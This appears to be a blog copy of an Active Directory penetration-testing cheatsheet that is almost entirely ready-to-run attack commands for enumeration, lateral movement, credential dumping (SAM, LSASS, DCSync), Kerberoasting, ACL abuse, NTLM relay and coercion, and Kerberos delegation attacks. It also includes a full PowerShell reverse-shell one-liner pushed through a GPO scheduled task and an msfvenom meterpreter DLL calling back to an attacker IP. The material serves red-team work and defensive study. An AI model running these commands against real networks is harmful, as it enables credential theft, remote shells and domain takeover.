---
title: "Active Directory Cheatsheet"
date: 2021-07-16T13:41:37+02:00
draft: false
---

# Active Directory - Python edition

This cheatsheet is a direct copy of https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-python-edition. All credits go to https://twitter.com/BlWasp_

## Misc

### Usernames wordlist

Create a wordlist of usernames from list of `Surname Name`

[Code in Gist here](https://gist.githubusercontent.com/superkojiman/11076951/raw/74f3de7740acb197ecfa8340d07d3926a95e5d46/namemash.py)

```bash
python3 namemash.py users.txt > usernames.txt
```

## Domain Enumeration

### Domain Policy

#### Current domain

```bash
#Domain policy with ldeep
ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> domain_policy

#Password policy with CME
crackmapexec smb <targets> -u user1 -p password --pass-pol
```

#### Another domain

```bash
ldeep ldap -u user1 -p password -d domain.local -s <remote_LDAP_server_IP> domain_policy
```

### Domain controller

The DNS is generally on the DC.

```bash
nslookup domain.local
crackmapexec smb <DC_IP> -u user1 -p password
```

### Users enumeration

#### List users

```bash
ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> users
```

#### User's properties

```bash
ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> users -v
```

#### Search for a particular string in attributes

```bash
ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> users -v |grep -i password
```

#### Actively logged users on a machine

Needs local admin rights on the target

```bash
crackmapexec smb <target> -u user1 -p password --sessions
```

### User hunting

#### Find machine where the user has admin privs

If a **Pwned** connection appears, admin rights are present. However, if the UAC is present it can block the detection.

```bash
crackmapexec smb <targets_file> -u user1 -p password
```

#### Find local admins on a domain machine

[POC here](https://gist.github.com/ropnop/7a41da7aabb8455d0898db362335e139)

```bash
python3 lookupadmins.py domain.local/user1:password@<target_IP>

#CME
crackmapexec smb <targets> -u user1 -p password --local-groups Administrators
```

### Computers enumeration

```bash
ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> machines

#Full info
ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> machines -v

#Hostname enumeration
ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> computers
ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> computers --resolve
```

### Groups enumeration

#### Groups in the current domain

```bash
ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> groups

#Full info
ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> groups -v
```

#### Search for a particular string in attributes

```bash
ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> groups -v |grep -i admin
```

#### All users in a specific group

```bash
ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> membersof <group> -v
```

#### All groups of an user

```bash
ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> memberships <user_account>
```

#### Local groups enumeration

```bash
crackmapexec smb <target> -u user1 -p password --local-groups
```

#### Members of a local group

```bash
crackmapexec smb <target> -u user1 -p password --local-groups <group>
```

### Shares / Files

#### Find shares on the domain

```bash
crackmapexec smb <targets> -u user1 -p password --shares
```

#### Find files with a specific pattern

```bash
crackmapexec smb <targets> -u user1 -p password --spider <share_name> --content --pattern pass
```

### GPO Enumeration

#### List of GPO in the domain

```bash
ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> gpo
```

### Organisation Units

#### OUs of the domain and their linked GPOs

```bash
ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> ou
```

#### Computers within an OU

```bash
ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> machines -v |grep -i "OU=<OU_name>" |grep -i "distinguishedName"
```

### ACLs

#### All ACLs associated to an object (inbound)

```bash
#With samAccountName
dacledit.py -action read -target <target_samAccountName> -dc-ip <DC_IP> domain.local/user1:password

#With DN
dacledit.py -action read -target-dn <target_DN> -dc-ip <DC_IP> domain.local/user1:password

#With SID
dacledit.py -action read -target-sid <target_SID> -dc-ip <DC_IP> domain.local/user1:password
```

#### Outbound ACLs of an object

These are the rights a principal has against another object

```bash
dacledit.py -action read -target <target_samAccountName> -principal <principal_samAccountName> <-dc-ip <DC_IP> domain.local/user1:password
```

### Trusts

#### Trusts for the current domain

```bash
ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> trusts
```

## BloodHound

The Bloodhound-python module doesn't support all the SharpHound features (essentially about GPOs)

### DNS resolution

Sometimes the DNS resolution to find the DC doesn't work very well. **dnschef** can solve this problem:

```bash
dnschef --fakeip <DC_IP> --fakedomains domain.local -q
```

Then, in the BloodHound command specify the DNS address with `-ns 127.0.0.1`, **dnschef** will do the work.

### Basic usage

```bash
# Default collection
bloodhound-python -u user1 -p password -d domain.local -dc DC.domain.local --zip

# All collection excepted LoggedOn
bloodhound-python -u user1 -p password -d domain.local -c all -dc DC.domain.local --zip
#With LoggedOn
bloodhound-python -u user1 -p password -d domain.local -c all,LoggedOn -dc DC.domain.local --zip

#Only collect from the DC, doesn't query the computers (more stealthy)
bloodhound-python -u user1 -p password -d domain.local -c DCOnly -dc DC.domain.local --zip
```

### Specify another Global Catalog

```bash
bloodhound-python -u user1 -p password -d domain.local -dc DC.domain.local -gc <hostname> --zip
```

### Interesting Neo4j queries

#### Users with SPNs

```sql
MATCH (u:User {hasspn:true}) RETURN u
```

#### AS-REP Roastable users

```sql
MATCH (u:User {dontrepreauth:true}) RETURN u
```

#### Computers AllowedToDelegate to other computers

```sql
MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) return p
```

#### Shortest path from Kerberoastable user

```sql
MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p
```

#### Computers in Unconstrained Delegations

```sql
MATCH (c:Computer {unconsraineddelegation:true}) RETURN c
```

#### Rights against GPOs

```sql
MATCH (gr:Group), (gp:GPO), p=((gr)-[:GenericWrite]->(gp)) return p
```

#### Potential SQL Admins

```sql
MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) return p
```

#### LAPS

Machine with LAPS enabled

```sql
MATCH (c:Computer {haslaps:true}) RETURN c 
```

Users with read LAPS rights against "LAPS machines"

```sql
MATCH p=(g:Group)-[:ReaLAPSPassword]->(c:Computer) return p
```

## Lateral Movement

### WinRM

```bash
evil-winrm -u user1 -p password -i <target_IP>
```

**evil-winrm** permits to open an interactive WinRM session where it is possible to `upload` and `download` items between the target and the attacker machine, load PowerShell scripts, etc.

### SMB

#### From one computer to another one

```bash
psexec.py domain.local/user1:password@<target>
```

#### From one computer to many ones

```bash
crackmapexec smb <targets> -u user1 -p password -X <command>
```

#### Execute immediat scheduled task

```bash
atexec.py domain.local/user1:password@<target> <command>
```

### WMI

```bash
wmiexec.py domain.local/user1:password@<target>
```

### ShellBrowserWindow DCOM object

```bash
dcomexec.py domain.local/user1:password@<target>
```

### Credentials gathering

#### Check RunAsPPL

Check if RunAsPPL is enabled in the registry.

```bash
crackmapexec smb <target> -u user1 -p password -M runasppl
```

#### Dump creds remotely

```bash
#Dump SAM database on a machine
crackmapexec smb <target> -u user1 -p password --sam

#Dump LSA secrets on a machine
crackmapexec smb <target> -u user1 -p password --lsa

#Dump the lsass process and parse it
crackmapexec smb <target> -u user1 -p password -M lsassy
crackmapexec smb <target> -u user1 -p password -M nanodump
crackmapexec smb <target> -u user1 -p password -M mimikatz
crackmapexec smb <target> -u user1 -p password -M procdump

#Retrieve Chrome passwords
crackmapexec smb <target> -u user1 -p password -M enum_chrome

#Make a DCSync attack on all the users (NT hashes, Kerberos AES key, etc)
secretsdump.py domain.local/user1:password@<DC>

#DCSync only the NT && LM hashes of a user
secretsdump.py -just-dc-user 'krbtgt' -just-dc-ntlm domain.local/user1:password@<DC>
```

#### Extract creds locally

```bash
#Extract creds from SAM, SYSTEM and SECURITY
secretsdump.py -system ./system.save -sam ./sam.save -security ./security.save LOCAL

#Extract creds from NTDS.dit
secretsdump.py -ntds ./NTDS.save LOCAL
```

#### Credentials Vault & DPAPI

Decipher Vault with Master Key

```bash
dpapi.py vault -vcrd <vault_file> -vpol <vault_policy_file> -key <master_key>
```

Dump all secrets on a remote machine

```bash
DonPAPI.py domain.local/user1:password@<target>
```

Extract the domain backup key with a Domain Admin

```bash
dpapi.py backupkeys --export -t domain.local/user1:password@<DC_IP>
```

Dump all user secrets with the backup key

```bash
DonPAPI.py -pvk domain_backupkey.pvk domain.local/user1:password@<targets>
```

#### GPPPassword

Find and decrypt Group Policy Preferences passwords.

```bash
Get-GPPPassword.py domain.local/user1:password@<target>

#Specific share
Get-GPPPassword.py -share <share> domain.local/user1:password@<target>
```

### Pass The Hash

Globally, all the **Impacket** tools and the ones that use the library can authenticate via Pass The Hash with the `-hashes` command line parameter instead of specifying the password.
For **ldeep**, **CrackMapExec** and **evil-winrm**, it's `-H`.

### Over Pass The Hash / Pass The Key

Globally, all the **Impacket** tools and the ones that use the library can authenticate via Pass The Key with the `-aesKey` command line parameter instead of specifying the password.
For **CrackMapExec** it's `--aesKey`.

### Kerberos authentication

Load a kerberos ticket in `.ccache` format : `export KRB5CCNAME=./ticket.ccache`

Globally, all the **Impacket** tools and the ones that use the library can authenticate via Kerberos with the `-k -no-pass` command line parameter instead of specifying the password.
For **ldeep** and **CrackMapExec** it's `-k`.
For **evil-winrm** it's `-r <domain> --spn <SPN_prefix>` (default 'HTTP'). The realm must be specified in the file `/etc/krb5.conf` using this format -> `CONTOSO.COM = { kdc = fooserver.contoso.com }`

If the Kerberos ticket is in `.kirbi` format it can be converted like this:

```bash
ticketConverter.py ticket.kirbi ticket.ccache
```

### ADIDNS Poisoning

How to deal with the **Active Directory Integrated DNS** and redirect the NTLM authentications to us

* By default, any user can create new ADIDNS records
* But it is not possible to change or delete a record we are not owning
* By default, the DNS will be used first for name resolution in the AD, and then NBT-NS, LLMNR, etc

{% hint style="info" %}
If the **wilcard record** (\*) doesn't existe, we can create it and all the authentications will arrive on our listener&#x20;
{% endhint %}

#### Wildcard attack

The char `*` can't be added via DNS protocol because it will break the request. Since we are in an AD we can modify the DNS via LDAP:

```bash
# Check if the '*' record exist
python3 dnstool.py -u "domain.local\user1" -p "password" -a query -r "*" <DNS_IP>

# creates a wildcard record
python3 dnstool.py -u "domain.local\user1" -p "password" -a add -r "*" -d <attacker_IP> <DNS_IP>

# disable a node
python3 dnstool.py -u "domain.local\user1" -p "password" -a remove -r "*" <DNS_IP>

# remove a node
python3 dnstool.py -u "domain.local\user1" -p "password" -a ldapdelete -r "*" <DNS_IP>
```

## Domain Privesc

### Kerberoast

The Kerberos session ticket (TGS) has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack.
Password hashes of service accounts could be used to create Silver tickets.

#### Find user with SPN

```bash
GetUserSPNs.py -dc-ip <DC_IP> domain.local/user1:password

#In another domain through trust
GetUserSPNs.py -dc-ip <DC_IP> -target-domain <target_domain> domain.local/user1:password
```

#### Request in JtR/Hashcat format

```bash
GetUserSPNs.py -dc-ip <DC_IP> -request -outputfile hash.txt domain.local/user1:password
```

#### Crack the hash

```bash
john hash.txt --wordlist=./rockyou.txt
```

### AS-REP Roasting

* If a user's **UserAccountControl** settings have "Do not require Kerberos preauthentication" enabled -> Kerberos preauth is disabled -> it is possible to grab user's crackable AS-REP and brute-force it offline.
* With sufficient rights (**GenericWrite** or **GenericAll**), Kerberos preauth can be disabled.

#### Enumerate users

```bash
GetNPUsers.py -dc-ip <DC_IP> domain.local/user1:password
```

#### Request AS-REP

```bash
GetNPUsers.py -dc-ip <DC_IP> -request -format john domain.local/user1:password
```

#### Crack the hash

With **john** or **hashcat** it could be performed

### ACLs Attacks

#### ACLs packages

* **Owns object**
  * WriteDacl
* **GenericAll**
  * GenericWrite
  * AllExtendedRights
  * WriteOwner
* **GenericWrite**
  * Self
  * WriteProperty
* **AllExtendedRights**
  * User-Force-Change-Password
  * DS-Replication-Get-Changes
  * DS-Replication-Get-Changes-All
  * DS-Replication-Get-Changes-In-Filtered-Set

#### On any objects

##### WriteOwner
With this rights on a user it is possible to become the "owner" (**Grant Ownership**) of the account and then change our ACLs against it

```bash
owneredit.py -new-owner user1 -target user2 -dc-ip <DC_IP> -action write 'domain.local'/'user1':'password'
dacledit.py -action write -target user2 -principal user1 -rights ResetPassword -ace-type allowed -dc-ip <DC_IP> 'domain.local'/'user1':'password'

#And change the password
net rpc password user2 -U 'domain.local'/'user1'%'password' -S DC.domain.local
```

##### WriteDacl
With this rights we can modify our ACLs against the target, and give us **GenericAll** for example

```bash
dacledit.py -action write -target user2 -principal user1 -rights FullControl -ace-type allowed -dc-ip <DC_IP> 'domain.local'/'user1':'password'
```

#### On an user

##### WriteProperty
* ShadowCredentials

```bash
pywhisker.py -t user2 -a add -u user1 -p password -d domain.local -dc-ip <DC_IP> --filename user2
```

* Targeted Kerberoasting

We can then request a TGS without special privileges. The TGS can then be "**Kerberoasted**".

```bash
GetUserSPNs.py -request-user user2 -dc-ip <DC_IP> domain.local/user1:password
```

**New SPN must be unique in the domain**

```bash
#Set SPN on all the possible users, request the ticket and delete the SPN
targetedKerberoast.py -u user1 -p password -d domain.local --only-abuse
```

##### User-Force-Change-Password
With enough permissions on a user, we can change his password

```bash
net rpc password user2 -U 'domain.local'/'user1'%'password' -S DC.domain.local
```

#### On a computer

##### WriteProperty
* ShadowCredentials

```bash
pywhisker.py -t computer$ -a add -u user1 -p password -d domain.local -dc-ip <DC_IP> --filename user2
```

* [Kerberos RBCD](https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-python-edition#bkmrk-resource-based-const)

##### AllExtendedRights
* ReadLAPSPassword

```bash
crackmapexec ldap <DC_IP> -u user1 -p password -M laps -O computer="<target>"
```

* ReadGMSAPassword

```bash
ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> gmsa
```

* RBCD

It seems that an [RBCD](https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-python-edition#bkmrk-resource-based-const) can be realized with AllExtendedRights on a computer as well.

#### On a group

##### WriteProperty/AllExtendedRights/GenericWrite Self
With one of this rights we can add a new member to the group

```bash
net rpc group addmem <group> user2 -U domain.local/user1%password -S <DC_IP>
```

#### On GPO

##### WriteProperty on a GPO
* We can update a GPO with a scheduled task for example to obtain a reverse shell

```bash
./pygpoabuse.py domain.local/user1 -hashes lm:nt -gpo-id "<GPO_ID>" -powershell -command "\$client = New-Object System.Net.Sockets.TCPClient('attacker_IP',1234);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" -taskname "The task" -description "Important task" -user
```

* Create a local admin

```bash
./pygpoabuse.py domain.local/user1 -hashes lm:nt -gpo-id "<GPO_ID>"
```

#### On the domain/forest

##### DS-Replication-Get-Changes + DS-Replication-Get-Changes-All
We can [**DCSync**](https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-python-edition#bkmrk-credentials-gatherin)

### Account Operators

The members of this group can add and modify all the non admin users and groups. Since **LAPS ADM** and **LAPS READ** are considered as non admin groups, it's possible to add an user to them, and read the LAPS admin password

#### Add user to LAPS groups

```bash
net rpc group addmem 'LAPS ADM' user2 -U domain.local/user1%password -S <DC_IP>
net rpc group addmem 'LAPS READ' user2 -U domain.local/user1%password -S <DC_IP>
```

#### Read LAPS password

```bash
crackmapexec ldap <DC_IP> -u user2 -p password -M laps -O computer="<target>"
```

### DNS Admin

* It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM).
* In case the DC also serves as DNS, this will provide us escalation to DA.
* Need privileges to restart the DNS service.

```bash
#Generate the DLL
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_IP> LPORT=1234 -f dll > rev.dll

#On the DNS machine, modify the server conf
crackmapexec smb <target> -u user1 -p password -X "dnscmd.exe /config /serverlevelplugindll \\<share_SMB>\rev.dll"

#### Restart DNS
services.py 'domain.local'/'user1':'password'@<DNS_server> stop dns
services.py 'domain.local'/'user1':'password'@<DNS_server> start dns
```

### Backup Operators

Can _normally_ log in on any machines of the domain.

#### File system backup

Can backup the **entire file system** of a machine (DC included) and have full read/write rights on the backup.

To backup a folder content:

```bash
crackmapexec smb <target> -u user1 -p password -X "robocopy /B C:\Users\Administrator\Desktop\ C:\tmp\tmp.txt /E"
```

To backup with **Diskshadow + Robocopy**:

* Create a `script.txt` file to backup with Diskshadow and upload it on the target

```plain
set verbose onX
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```

* Backup with `diskshadow /s script.txt` in the `crackmapexec` command parameter
* Retrieve the backup with **robocopy** and send the NTDS file in the current folder : `robocopy /b E:\Windows\ntds . ntds.dit` (still with CME)
* Then retrieve the SYSTEM registry hive to decrypt and profit `reg save hklm\system c:\temp\system` (always)

#### Registry read rights

The **Backup Operators** can read all the machines registry

```bash
reg.py -dc-ip 192.168.24.10 'domain.local'/'backup$':'Password123'@server.domain.local query -keyName 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon'
```

#### GPOs read/write rights

Normally the **Backup Operators** can read and rights all the domain and DC GPOs with **robocopy** in **backup** mode

* Found the interesting GPO with `Get-NetGPO` . For example **Default Domain Policy** in the Domain Controller policy
* Get the file at the path `\\dc.domain.local\SYSVOL\domain.local\Policies\{GPO_ID}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf` and add whatever you want in it
* Write the file with **robocopy**:

```bash
crackmapexec smb <target> -u user1 -p password -X 'robocopy "C:\tmp" "\\dc.domain.local\SYSVOL\domain.local\Policies\{GPO_ID}\MACHINE\Microsoft\Windows NT\SecEdit" GptTmpl.inf /ZB'
```

## NTLM

### Capture, Coerce and Leak NTLM

Different ways to obtain and catch Net-NTLM authentications and retrieve a NTLM response.

#### Responder / Inveigh

Change the authentication challenge to `1122334455667788` in the Responder conf file in order to obtain an easily crackable hash if **NTLMv1** is used.

```bash
sed -i 's/ Random/ 1122334455667788/g' Responder/Responder.conf
```

Catch all the possible hashes on the network (coming via LLMNR, NBT-NS, DNS spoofing, etc):

```bash
# Responder with WPAD injection, Proxy-Auth, DHCP, DHCP-DNS and verbose
responder -I interface_to_use -wPdDv
```

Force NTLM downgrade to NTLMv1 (will break the authentications if v1 is disabled on the machine):

```bash
# --disable-ess will disable the SSP, not always usefull
responder -I interface_to_use -wdDv --lm --disable-ess
```

**NTLMv1** response can be cracked on [crash.sh](https://crack.sh/).

#### Leak Files

With write rights on a SMB share, it is possible to drop a `.scf` file to grab some user hashes:

```bash
crackmapexec smb <target> -u user1 -p password -M slinky -o SERVER=<attacker_SMB_share_IP> -o NAME=<file_name>

#To clean
crackmapexec smb <target> -u user1 -p password -M slinky -o CLEANUP=True
```

#### MITM6

Spoof DHCPv6 responses. Usefull to combine with NTLM or Kerberos Relay attacks.

```bash
mitm6 -i interface_to_use -d domain.local
```

#### PetitPotam / PrinterBug / ShadowCoerce

Exploits to coerce Net-NTLM authentication from a computer. **PetitPotam** can be used without any credentials if no patch has been installed.

```bash
#PetitPotam
./petitpotam.py -u user1 -p password -d domain.local -pipe all <attacker_IP> <target_IP>

#PrinterBug
./dementor.py -u user1 -p password -d domain.local <attacker_IP> <target_IP>

#ShadowCoerce
shadowcoerce.py -u user1 -p password -d domain.local <attacker_IP> <target_IP>
```

#### PrivExchange

Coerce Exchange server authentication via **PushSubscription** (now patched):

```bash
python3 privexchange.py -ah <attacker_IP> <Exchange_server> -u user1 -p password -d domain.local
```

#### MSSQL Server

With [xp\_dirtree](https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-python-edition#bkmrk-rbcd-from-mssql-serv).

#### WebClient Service

If this service runs on the target machine, a SMB authentication can be switched into an HTTP authentication (really useful for NTLM relay).

Check if WebClient is running on machines:

```bash
webclientservicescanner domain.local/user1:password@<IP_range>
```

If yes, coerce the authentication to the port 80 on the attacker IP. To bypass trust zone restriction, the attacker machine must be specified with a valid **NETBIOS name** and not its IP. the FQDN can be obtained with Responder in Analyze mode.

```bash
responder -I interface_to_use -A

#Coerce with PetitPotam for example
./petitpotam.py -u user1 -p password -d domain.local -pipe all "attacker_NETBIOS@80/test.txt" <target_IP>
```

### NTLM Relay

#### SMB without signing

Create a list of computer without SMB signing:

```bash
crackmapexec smb <IP_range> -u user1 -p password --gen-relay-list list.txt
```

#### ntlmrelayx

If only SMBv2 is supported, `-smb2support` can be used. To attempt the remove the MIC if vulnerable, `--remove-mic` can be used.

Multiple targets can be specified with `-tf list.txt`.

* Enumeration

```bash
#With attempt to dump possible GMSA and LAPS passwords, and ADCS templates
ntlmrelayx.py -t ldap://dc --dump-adcs --dump-laps --dump-gmsa --no-da --no-acl
```

* SOCKS

```bash
ntlmrelayx.py -t smb://target -socks
ntlmrelayx.py -t mssql://target -socks
```

* Creds dump

```bash
ntlmrelayx.py -t smb://target
```

* DCSync

```bash
ntlmrelayx.py -t dcsync://dc
```

* Privesc

Add an user to **Enterprise Admins**.

```bash
ntlmrelayx.py -t ldap://dc --escalate-user user1 --no-dump
```

* Create a computer account

```bash
#Create a new computer account through LDAPS
ntlmrelayx.py -t ldaps://dc_IP --add-computer --no-dump --no-da --no-acl

#Create a new computer account through LDAP with StartTLS
ntlmrelayx.py -t ldap://dc_IP --add-computer --no-dump --no-da --no-acl

#Create a new computer account through SMB through the SAMR named pipe (https://github.com/SecureAuthCorp/impacket/pull/1290)
ntlmrelayx.py -t smb://dc_IP --smb-add-computer EVILPC
```

* Kerberos Delegation

Kerberos RBCD are detailled in the following delegation

```bash
#Create a new computer account through LDAPS and enabled RBCD
ntlmrelayx.py -t ldaps://dc_IP --add-computer --delegate-access --no-dump --no-da --no-acl

#Create a new computer account through LDAP with StartTLS and enabled RBCD
ntlmrelayx.py -t ldap://dc_IP --add-computer --delegate-access --no-dump --no-da --no-acl

#Doesn't create a new computer account and use an existing one
ntlmrelayx.py -t ldap://dc_IP --escalate-user <controlled_computer> --delegate-access --no-dump --no-da --no-acl
```

* From a mitm6 authent

```bash
#Attempts to open a socks and write loot likes dumps into a file
ntlmrelayx.py -tf targets.txt -wh attacker.domain.local -6 -l loot.txt -socks
```

* [ADCS ESC8](https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-certificate-services#bkmrk-http-endpoint---esc8)

## **Kerberos Delegations**

Kerberos delegations can be used for local privesc, lateral movement or domain privesc. The main purpose of Kerberos delegations is to permit a principal to access a service on behalf of another principal.

There are two main types of delegation:

* **Unconstrained Delegation**: the first hop server can request access to any service on any computer
* **Constrained Delegation**: the first hop server has a list of service it can request

### Unconstrained delegation

* A user request a TGT to the DC
* The user requests a TGS for a service on a computer which is in Unconstrained Delegation
* The DC places user's TGT inside TGS. When presented to the server with unconstrained delegation, the TGT is extracted from TGS and stored in **LSASS**. This way the server can reuse the user's TGT to access any other resource as the user
* This behavior can be abused by extracting the TGT from the previous users stored in LSASS



#### Enumerate principals with Unconstrained Delegation

Works for computers and users

```bash
findDelegation.py -dc-ip <DC_IP> domain.local/user1:password

#For another domain across trust
findDelegation.py -target-domain <target_domain> domain.local/user1:password
```

#### Unconstrained Delegation attack

If we have enough rights against a principal (computer or user) in UD to add a **SPN** on it and **know its password**, we can try to use it to retrieve a machine account password from an authentication coercion.

* Add a new DNS record on the domain that point to our IP
* Add a SPN on the principal that point to the DNS record and change its password (will be usefull for the tool `krbrelayx.py` to extract the TGT from the ST)
* Trigger the authentication and grab the ST (and TGT in it) on **krbrelayx** that is listenning for it

Since the user is in **Unconstrained Delegation**, when the machine account will send the **ST** to the SPN it will automatically add a **TGT** in it, and because the SPN is pointing to us with the DNS record, we can retrieve the TGS, decipher the ciphered part with the user password (the SPN is setup on the user, so the TGS is ciphered with his password), and retrieve the TGT.

```bash
#Add the SPN
python3 addspn.py -u 'domain.local\user1' -p 'password' -s 'HOST/attacker.domain.local' -t 'target.domain.local' --additional <DC_IP>

#Create the DNS record
python3 dnstool.py -u 'domain.local\user1' -p 'password' -r 'attacker.domain.local' -d '<attacker_IP>' --action add <DC_IP>

#Run krbrelayx with the hash of the password of the principal
python3 krbrelayx.py -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip dc.domain.local

#Trigger the coercion
./petitpotam.py -u user1 -p password -d domain.local -pipe all "attacker.domain.local" <target_IP>
```

### Constrained Delegation

In this situation, the computer in delegation has a list of services where it can delegate an authentication. This is controlled by `msDS-AllowedToDelegateTo` attribute that contains a list of SPNs to which the user tokens can be forwarded. No ticket is stored in LSASS.

To impersonate the user, Service for User (S4U) extension is used which provides two extensions:

* Service for User to Self (**S4U2self**) - Allows a service to obtain a forwardable TGS to itself on behalf of a user with just the user principal name without supplying a password. The service account must have the **TRUSTED\_TO\_AUTHENTICATE\_FOR\_DELEGATION** – T2A4D UserAccountControl attribute.
* Service for User to Proxy (**S4U2proxy**) - Allows a service to obtain a TGS to a second service on behalf of a user.

#### Enumerate users and computers with CD enabled

```bash
findDelegation.py -dc-ip <DC_IP> domain.local/user1:password

#For another domain across trust
findDelegation.py -target-domain <target_domain> domain.local/user1:password
```

#### With protocol transition

Any service can be specified on the target since it is not correctly checked.

```bash
getST.py -spn 'cifs/target.domain.local' -impersonate administrator -hashes ':<computer_NThash>' -dc-ip <DC_IP> domain.local/computer
export KRB5CCNAME=./Administrator.ccache
```

#### Without protocol transition

In this case, it is not possible to use **S4U2self** to obtain a forwardable ST for a specific user. This restriction can be bypassed with an RBCD attack detailled in the following section.

### Resource-Based Constrained Delegation

[**Wagging The Dog**](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)

With RBCD, this is the resource machine (the machine that receives delegation) which has a list of services that can delegate to it. This list is specified in the attribute `msds-allowedtoactonbehalfofotheridentity` and the computer can modified its own attribute (really usefull in NTLM relay attack scenario).

#### Requirements

* The DC has to be at least a **Windows Server 2012**
* Write rights on the target machine (**GenericAll, GenericWrite, AllExtendedRights**)
* Target computer, object must not have the attribute `msds-allowedtoactonbehalfofotheridentity` set

#### Enumerate users and computers with RBCD enabled

```bash
findDelegation.py -dc-ip <DC_IP> domain.local/user1:password

#For another domain across trust
findDelegation.py -target-domain <target_domain> domain.local/user1:password

#Check the attribute on an account
rbcd.py -action read -delegate-to ServiceB$ domain.local/user1:password
```

#### Standard RBCD

The attaker has compromised ServiceA and want to compromise ServiceB. Additionnally he has sufficient rights to configure `msds-allowedtoactonbehalfofotheridentity` on ServiceB.

```bash
#Add RBCD from ServiceA to ServiceB
rbcd.py -action write -delegate-from ServiceA$ -delegate-to ServiceB$ domain.local/user1:password

#Verify property
rbcd.py -action read -delegate-to ServiceB$ domain.local/user1:password

#Get ServiceA TGT and then S4U
getST.py -spn 'cifs/serviceB.domain.local' -impersonate administrator -hashes ':<ServiceA_NThash>' -dc-ip <DC_IP> domain.local/ServiceA$
export KRB5CCNAME=./Administrator.ccache
```

#### With machine account creation

* Domain users can create some machines, `ms-ds-machineaccountquota` must not being to 0
* Add a fake machine account in the domain
* Add it to the `msds-allowedtoactonbehalfofotheridentity` attribute of the target machine

```bash
addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -domain-netbios domain.local 'domain.local/user1:password'
rbcd.py -action write -delegate-from ControlledComputer$ -delegate-to ServiceB$ 'domain.local/user1:password'
```

* Use the **S4USelf** function with the fake machine (on an arbitrary SPN) to create a forwardable ticket for a wanted user (not **protected**)
* Use the **S4UProxy** function to obtain a TGS for the impersonated user for the wanted service on the target machine;

```bash
getST.py -spn 'cifs/serviceB.domain.local' -impersonate administrator -dc-ip <DC_IP> domain.local/ControlledComputer$:ComputerPassword
export KRB5CCNAME=./Administrator.ccache
```

#### Skip S4USelf

* Attacker has compromised Service A, has sufficient ACLs against Service B to configure RBCD, and wants to attack Service B
* By social engineering or any other solution, an interesting victim authenticates to Service A with a TGS
* Attacker dumps the TGS on Service A (`sekurlsa::tickets`)
* Attacker configures RBCD from Service A to Service B as above
* Attacker performs S4UProxy and bypass S4USelf by providing the TGS as evidence

**NOT TESTED IN MY LAB WITH IMPACKET**

```bash
getST.py -spn 'cifs/serviceB.domain.local' -additional-ticket ./ticket.ccache -hashes ':<ServiceA_NThash>' -dc-ip <DC_IP> domain.local/ServiceA$
```

#### Reflective RBCD

With a TGT or the hash of a service account, an attacker can configure a RBCD from the service to itself, and run a full S4U to access to access the machine on behalf of another user.

```bash
rbcd.py -action write -delegate-from ServiceA$ -delegate-to ServiceA$ -k -no-pass domain.local/ServiceA$
getST.py -spn 'cifs/serviceA.domain.local' -impersonate administrator -k -no-pass -dc-ip <DC_IP> domain.local/ServiceA$
```

#### Impersonate protected user via S4USelf request

It is possible to impersonate a **protected user** with the **S4USelf** request if we have a TGT (or the creds) of the target machine (for example from an **Unconstrained Delegation**).

With the target TGT it is possible to realise a S4USelf request for any user and obtain a TGS for the service. In case where the needed user is protected against delegation, S4USelf will still work, but the TGS is not forwardable (so no S4UProxy possible) and the specified SPN is invalid...however, the SPN is not in the encrypted part of the ticket. So it is possible to modify the SPN and retrieve a valid TGS for the target service with a sensitive user (and the TGS PAC is well signed by the KDC).

```bash
getST.py -self -spn 'cifs/serviceA.domain.local' -impersonate administrator -k -no-pass -dc-ip <DC_IP> domain.local/ServiceA$
```

#### Bypass Constrained Delegation restrictions with RBCD

* Attacker compromises **ServiceA** and **ServiceB**
